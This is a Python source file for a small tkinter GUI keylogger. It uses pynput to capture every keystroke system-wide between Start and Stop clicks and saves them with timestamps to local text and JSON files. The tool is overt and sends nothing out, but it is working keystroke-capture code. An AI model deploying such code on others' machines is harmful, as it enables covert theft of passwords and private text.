import tkinter as tk
from tkinter import ttk, messagebox
from pynput import keyboard
import threading
import time
import json

# --- FIX: Create the main window FIRST ---
root = tk.Tk()
root.title("Python Keylogger")
root.geometry("400x250")
root.resizable(False, False)

# Global variables
listener = None
logged_keys = []
# Now it's safe to create the variable, as 'root' exists
json_enabled = tk.BooleanVar(value=True)

def on_press(key):
    """Callback function for when a key is pressed."""
    global logged_keys
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(' ')
        elif key == keyboard.Key.enter:
            logged_keys.append('\n')
        elif key == keyboard.Key.tab:
            logged_keys.append('\t')
        else:
            logged_keys.append(f' [{str(key)}] ')

def start_logger():
    """Starts the keylogger in a separate thread."""
    global listener
    if listener is not None and listener.is_alive():
        messagebox.showwarning("Warning", "Keylogger is already running.")
        return

    logged_keys.clear()
    status_label.config(text="Status: Logging...", foreground="red")

    def run_listener():
        global listener
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
        status_label.config(text="Status: Stopped", foreground="black")

    listener_thread = threading.Thread(target=run_listener, daemon=True)
    listener_thread.start()

def stop_logger():
    """Stops the keylogger and saves the logs to a file."""
    global listener
    if listener is None or not listener.is_alive():
        messagebox.showinfo("Info", "Keylogger is not running.")
        status_label.config(text="Status: Idle", foreground="black")
        return

    listener.stop()
    status_label.config(text="Status: Stopped. Saving log...", foreground="blue")

    log_content = "".join(logged_keys)
    timestamp = time.ctime()
    
    # --- Save to TXT file ---
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write("\n--- NEW LOG SESSION ---\n")
            log_file.write(f"Timestamp: {timestamp}\n")
            log_file.write(log_content)
            log_file.write("\n--- END LOG SESSION ---\n\n")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save TXT log: {e}")
        return

    # --- Save to JSON file (if enabled) ---
    if json_enabled.get():
        log_entry = {
            "timestamp": timestamp,
            "log_content": log_content
        }
        
        try:
            with open("keylog.json", "r") as json_file:
                data = json.load(json_file)
        except (FileNotFoundError, json.JSONDecodeError):
            data = []
        
        data.append(log_entry)
        
        try:
            with open("keylog.json", "w") as json_file:
                json.dump(data, json_file, indent=4)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save JSON log: {e}")

    messagebox.showinfo("Success", f"Keystrokes saved to keylog.txt" + (" and keylog.json" if json_enabled.get() else ""))
    status_label.config(text="Status: Idle", foreground="black")


# --- GUI Setup (now that 'root' exists) ---
style = ttk.Style(root)
style.configure("TButton", font=("Helvetica", 12), padding=10)
style.configure("TLabel", font=("Helvetica", 12))
style.configure("TCheckbutton", font=("Helvetica", 11))

main_frame = ttk.Frame(root, padding="20")
main_frame.pack(expand=True, fill="both")

title_label = ttk.Label(main_frame, text="Simple Keylogger", font=("Helvetica", 16, "bold"))
title_label.pack(pady=(0, 10))

status_label = ttk.Label(main_frame, text="Status: Idle", foreground="black")
status_label.pack(pady=(0, 10))

json_checkbox = ttk.Checkbutton(
    main_frame, 
    text="Also save to JSON file", 
    variable=json_enabled
)
json_checkbox.pack(pady=(0, 20))

button_frame = ttk.Frame(main_frame)
button_frame.pack(fill="x", pady=10)

start_button = ttk.Button(button_frame, text="Start Logging", command=start_logger)
start_button.pack(side="left", expand=True, padx=(0, 10))

stop_button = ttk.Button(button_frame, text="Stop Logging", command=stop_logger)
stop_button.pack(side="right", expand=True, padx=(10, 0))

# Start the GUI event loop
root.mainloop()